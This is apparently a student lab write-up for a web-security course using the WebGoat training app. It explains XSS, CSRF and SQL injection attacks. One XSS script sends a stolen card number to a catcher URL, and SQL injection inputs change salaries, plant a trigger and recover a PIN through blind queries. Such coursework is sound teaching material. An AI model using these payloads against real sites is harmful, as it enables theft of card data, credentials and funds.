#Siyu Shao, 1007147204, jasmine.shao@mail.utoronto.ca
#Haijing Wang, 1006810024, haijing.wang@mail.utoronto.ca

part1:
    We exploited XSS by injecting HTML code into the search bar to create a fake login form. The credentials submitted through the form will be send to the hacker's server after clicking the login button.

part2:
    The field that is exploitable is input2, where the 3 digit assess code is enterd. The decoded scipt for the url is
    <SCRIPT>
    var infoElements = document.getElementById("message");

    infoElements.style.display = 'none';
    XssImage = new Image;
    XssImage.src = "http://localhost:2210/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + document.form.input1.value;
    </SCRIPT>
    when the script is injected in to input2, it will read the value of input1 and send it to the hacker's server.
    Error message is being hidden by getting the element with id "message" and display it as none. This ensures that the page with the injected script looks as close as
    possible to the original page for â€œReflected XSS Attacks"

part3: 
    We inject a malicious img element into the message content. To exploit this vulnerability, we set 
    up a "transfer" field in the url. When the img element is loaded, it transfers the recipient's money for the amount specified in the Transfer field.

part4:
    The message field is exploitable. We created two iframes with one source and one empty iframe. When onload, it sets the src of the empty iframe.

part5:
    We injected two iframes with the malicious src attribute and one javascript. The src of the first iframe starts the transfer with the defined amount. The script then sets the src of iframe2, which passes the token value through the onload function. After the script sets the src of iframe2, it reloads and completes the attack to transmit the values specified in the src. The onload event on iframe1 allows the parent page's JavaScript to access iframe1's content, which enables an attacker to extract the token value from iframe1's form and construct the request in iframe2 with the appropriate token, bypassing the same-origin policy restriction.

part6: 
    or 1=1 can make the statement always true, which will return all the records in the database. This ensures that all the credit card numbers being displayed.

part7:
    stage1 - The injected SQL statement consists a userid for the intended query and a malicious UPDATE query injected, with ';' to separate two parts. Since the input box is not sterilized, the UPDATE query after ';' will also be executed. When executed, this statement sets the employee's salary to 999.

    stage2 - Similar to stage 1, but after ';', a TRIGGER that sets the email for all new users to ece568_22s@utoronto.ca will be inserted and executed.

part8:
    The code I use to find the pin is 
    101 and ((SELECT pin from credit where cc_number=1234123412341234))>x
    or 
    101 and ((SELECT pin from credit where cc_number=1234123412341234))<x
    This will return valid if the compare statement to an abritary x value is true
    Then I try out different x value to narrow out the range of the pin value
    To test the finalized number I use
    101 and ((SELECT pin from credit where cc_number=1234123412341234))=x
    if returns valid, then x is the correct pin number.
    From testing I found that x is 3318

